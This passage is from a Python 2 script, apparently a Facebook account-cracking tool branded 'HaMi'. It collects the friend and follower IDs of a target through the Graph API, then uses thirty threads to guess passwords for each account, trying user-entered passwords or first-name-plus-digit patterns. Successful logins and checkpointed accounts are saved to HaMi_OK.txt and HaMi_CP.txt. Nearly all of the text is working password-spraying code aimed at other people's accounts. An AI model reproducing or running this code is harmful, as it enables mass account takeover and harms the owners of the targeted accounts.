        pass1 = raw_input(' \x1b[1;98m[1] Password : ')
        pass2 = raw_input(' \x1b[1;98m[2] Password : ')
        pass3 = raw_input(' \x1b[1;92m[3] Password : ')
        pass4 = raw_input(' \x1b[1;98m[4] Password : ')
        pass5 = raw_input(' \x1b[1;98m[5] Password : ')
        pass6 = raw_input(' \x1b[1;98m[6] Password : ')
        try:
            idlist = raw_input(' [+] File Name : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack_b()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option' + w
        c_s()
    print 'Total ids: ' + str(len(id))
    time.sleep(0.5)
    print '\x1b[1;98mCrack Running \x1b[1;91m'
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m  DONT HATE ANYONE     '
    os.system('echo -e "-----------------------------------------------"| lolcat')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('HaMi_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass1
                cp = open('HaMi_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('HaMi_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass2
                    cp = open('HaMi_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('HaMi_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass3
                        cp = open('HaMi_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('HaMi_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass4
                            cp = open('HaMi_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('HaMi_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass5
                                cp = open('HaMi_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('HaMi_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass6
                                    cp = open('HaMi_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print '\x1b[1;92mSuccessfully Done'
    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input('\x1b[1;93m Press enter to back')
    choice_crack()

def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;98mName Pass Cracking \x1b[1;91m'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print '\x1b[1;98m[1] Public ID Cloning'
    print '\x1b[1;98m[2] Followers Cloning'
    print '\x1b[1;98m[3] File Cloning'
    print '\x1b[1;98m[0] Back'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    a_s()


def name_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93mName Pass Cracking \x1b[1;91m'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print '\x1b[1;98m[1] Public ID Cloning'
    print '\x1b[1;98m[2] Followers Cloning'
    print '\x1b[1;98m[3] File Cloning'
    print '\x1b[1;98m[0] Back'
    os.system('echo -e "-----------------------------------------------"| lolcat')
    n_s()


def n_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input('\x1b[1;33m==>>>>')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;98mName Pass Public Cracking \x1b[1;91m'
        os.system('echo -e "-----------------------------------------------"| lolcat')
        p1 = raw_input(' \x1b[1;98m[1] Name + digit : ')
        p2 = raw_input(' \x1b[1;98m[2] Name + digit : ')
        p3 = raw_input(' \x1b[1;98m[3] Name + digit : ')
        p4 = raw_input(' \x1b[1;98m[4] Name + digit : ')
        idt = raw_input(' \x1b[1;98m[OK] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;98mName Pass Public Cracking '
            os.system('echo -e "-----------------------------------------------"| lolcat')
            print '\x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;93mName Pass Followers Cracking \x1b[1;91m'
        os.system('echo -e "-----------------------------------------------"| lolcat')
        p1 = raw_input(' \x1b[1;98m[1] Name + digit : ')
        p2 = raw_input(' \x1b[1;98m[2] Name + digit : ')
        p3 = raw_input(' \x1b[1;98m[3] Name + digit : ')
        p4 = raw_input(' \x1b[1;98m[4] Name + digit : ')
        idt = raw_input(' \x1b[1;98m[OK] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;98mName Pass Followers Cracking '
            os.system('echo -e "-----------------------------------------------"| lolcat')
            print '\x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;98mName Pass File Cracking \x1b[1;91m'
        os.system('echo -e "-----------------------------------------------"| lolcat')
        p1 = raw_input(' \x1b[1;98m[1] Name + digit : ')
        p2 = raw_input(' \x1b[1;98m[2] Name + digit : ')
        p3 = raw_input(' \x1b[1;98m[3] Name + digit : ')
        p4 = raw_input(' \x1b[1;98m[4] Name + digit : ')
        try:
            idlist = raw_input('[+] File Name : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print 'Total ids: ' + str(len(id))
    time.sleep(0.5)
    print '\x1b[1;98mCrack Running\x1b[1;98m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m   H A M I  '
    os.system('echo -e "-----------------------------------------------"| lolcat')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('HaMi_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass1
                cp = open('HaMi_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('HaMi_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass2
                    cp = open('HaMi_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('HaMi_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass3
                        cp = open('HaMi_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[HaMi-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('HaMi_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[HaMi-CP] ' + uid + ' | ' + pass4
                            cp = open('HaMi_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print '\x1b[1;92mSuccessfully Done'
    print '\x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    os.system('echo -e "-----------------------------------------------"| lolcat')
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()



if __name__ == '__main__':
    reg() 


